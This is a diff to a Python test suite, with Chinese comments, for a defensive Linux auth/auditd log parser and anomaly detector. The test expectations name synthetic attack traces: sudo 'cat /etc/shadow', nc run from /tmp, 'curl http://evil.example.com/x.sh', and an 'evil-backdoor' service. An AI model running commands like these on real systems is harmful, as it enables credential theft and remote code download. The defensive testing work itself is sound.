@@ -308,7 +308,7 @@ def t5():
 
         out = tmp / "all_events.jsonl"
         args = argparse.Namespace(file=None, dir=str(tmp), out=str(out),
-                                  post=None, limit=None, parser="auto")
+                                  post=None, limit=None, parser="auto", linux_host=None)
         result = run_dir(args, tmp)   # 内部会打印统计，返回值供断言
         assert result["files"] == 2 and len(result["broken_files"]) == 1, \
             f"坏文件应被识别并跳过: {result}"
@@ -350,14 +350,15 @@ def t6():
 check("契约2", "全量跑批产物(all_events.jsonl): 19键齐全+raw_log/detail/flags/severity类型正确", t6)
 
 
-# ---------- t7：任务6 Linux 解析器（auth + audit） ----------
+# ---------- t7：任务6 Linux 解析器（auth + audit原始格式 + audit解释格式） ----------
 def t7():
     from linux_log import parse_linux_auth, parse_linux_audit
     from anomaly import apply_anomaly_rules
 
     auth_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_auth.log"
     audit_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_audit.log"
-    assert auth_path.exists() and audit_path.exists(), "Linux合成样本缺失"
+    interp_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_audit_interp.log"
+    assert auth_path.exists() and audit_path.exists() and interp_path.exists(), "Linux合成样本缺失"
 
     # --- auth.log：SSH爆破→成功登录的完整片段 ---
     st = {}
@@ -375,11 +376,11 @@ def t7():
     assert all(e["timestamp"].endswith("+08:00") for e in evs)
     assert all(e["source"] == "linux_auth" and e["event_id"] is None for e in evs)
 
-    # --- audit.log：sudo提权 + 敏感文件访问（SYSCALL/PATH配对） ---
+    # --- audit.log（原始格式）：sudo提权 + 敏感文件访问 + execve兜底 ---
     st2 = {}
     evs2 = parse_linux_audit(str(audit_path), st2)
-    assert st2["parsed"] == 3 and st2["failed"] == 0 and st2["skipped_other"] == 2, st2
-    assert st2["by_event_id"] == {"USER_CMD": 1, "SYSCALL": 2}
+    assert st2["parsed"] == 4 and st2["failed"] == 0 and st2["skipped_other"] == 1, st2
+    assert st2["by_event_id"] == {"USER_CMD": 1, "file_open": 2, "execve": 1}
     sudo_ev = evs2[0]
     assert sudo_ev["event_type"] == "process_start"  # D决议：sudo→process_start不加新词
     assert sudo_ev["process"] == "cat" and sudo_ev["detail"]["sudo_command"] == "cat /etc/shadow"
@@ -389,16 +390,46 @@ def t7():
     shadow = next(e for e in fr if e["detail"]["file_path"] == "/etc/shadow")
     assert shadow["detail"]["audit_key"] == "sensitive", "audit规则key要保留（E配置的监控点）"
     assert shadow["process"] == "cat" and shadow["detail"]["syscall"] == "open"
+    # execve没有EXECVE记录时：process从exe取，cmdline如实null（不造假）
+    nc = next(e for e in evs2 if e["event_type"] == "process_start" and e["process"] == "nc")
+    assert nc["cmdline"] is None and nc["detail"]["exe"] == "/tmp/nc"
+    assert all(e["detail"]["audit_serial"] for e in evs2), "auditd事件都要带审计序号（溯源+去重键）"
 
-    # --- Linux事件直接吃异常规则：root三连败→brute_force，凌晨登录→offhour ---
+    # --- 解释格式（ausearch -i，E真实数据的形态）：中文时间戳+名字字段 ---
+    st3 = {}
+    evs3 = parse_linux_audit(str(interp_path), st3, host="ubuntu-vm")
+    assert st3["parsed"] == 4 and st3["failed"] == 0 and st3["skipped_other"] == 1, st3
+    assert st3["by_event_id"] == {"file_open": 1, "execve": 1, "connect_inet": 1,
+                                  "SERVICE_START": 1}
+    f1 = next(e for e in evs3 if e["event_type"] == "file_read")
+    assert f1["timestamp"] == "2026-09-08T10:06:41.516000+08:00", f"中文时间戳: {f1['timestamp']}"
+    assert f1["detail"]["file_path"] == "/home/mxy/case01-core/data/finance_demo.txt", \
+        "相对路径要和CWD拼成绝对路径"
+    assert f1["user"] == "mxy" and f1["detail"]["audit_key"] == "case01_demo_file"
+    p1 = next(e for e in evs3 if e["detail"].get("audit_serial") == 531)
+    assert p1["event_type"] == "process_start" and p1["process"] == "curl"
+    assert p1["cmdline"] == "curl http://evil.example.com/x.sh" and p1["user"] == "mxy"
+    n1 = next(e for e in evs3 if e["detail"].get("audit_serial") == 532)
+    assert n1["event_type"] == "network_connection"
+    assert n1["dst_ip"] == "192.168.1.102" and n1["dst_port"] == 80, \
+        f"SOCKADDR hex要解出IP:端口: {n1['dst_ip']}:{n1['dst_port']}"
+    svc = next(e for e in evs3 if e["event_type"].startswith("service_"))
+    assert svc["event_type"] == "service_started" and svc["detail"]["service_name"] == "evil-backdoor"
+
+    # --- 异常规则对Linux事件生效 + 跨文件去重 ---
     stats = apply_anomaly_rules(evs + evs2)
     assert stats["by_rule"]["brute_force"] == 3, f"root三连败应命中: {stats}"
     assert stats["by_rule"]["offhour_login"] == 1, f"凌晨02:55登录应命中: {stats}"
     assert stats["flagged"] == 4
+    from run_parse import dedupe_linux_audit
+    merged = evs3 + parse_linux_audit(str(interp_path), {})   # 同一文件解析两遍=跨文件重复场景
+    deduped, removed = dedupe_linux_audit(merged)
+    assert removed == 4 and len(deduped) == 4, f"按审计序号去重: removed={removed}"
 
 
-check("任务6", "Linux解析: sshd登录成功/失败+invalid_user线索 / sudo USER_CMD(hex解码)→process_start / "
-               "SYSCALL+PATH配对→file_read / 异常规则对Linux事件同样生效", t7)
+check("任务6", "Linux解析: sshd登录 / audit原始+解释双格式(中文时间戳) / sudo USER_CMD(hex解码) / "
+               "execve→process_start带cmdline / open→file_read(CWD拼绝对路径) / inet connect→network_connection / "
+               "SERVICE_START / 异常规则生效 / 跨文件去重", t7)
 
 
 # ---------- 汇总 ----------
